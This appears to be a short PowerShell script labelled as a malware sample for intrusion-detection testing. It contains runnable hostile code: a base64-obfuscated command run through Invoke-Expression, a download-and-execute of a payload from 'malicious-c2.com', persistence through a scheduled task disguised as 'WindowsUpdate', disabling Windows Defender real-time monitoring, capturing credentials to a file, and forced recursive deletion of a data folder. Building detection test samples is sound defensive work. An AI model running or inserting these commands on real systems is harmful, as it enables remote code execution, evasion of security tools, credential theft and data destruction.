# PowerShell Malware Sample - FOR TESTING ONLY
# This script contains malicious patterns for IDS testing

# Obfuscation
$encoded = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=="
iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded)))

# Network activity
$client = New-Object System.Net.WebClient
$payload = $client.DownloadString("http://malicious-c2.com/payload.ps1")

# Execution
Invoke-Expression $payload
Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c calc.exe"

# Persistence
$task = New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc $encoded")
Register-ScheduledTask -TaskName "WindowsUpdate" -Task $task

# Anti-analysis
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Credential theft
$cred = Get-Credential
$cred | Export-Clixml -Path "C:\creds.xml"

# Dangerous command
Remove-Item -Path "C:\important\data" -Recurse -Force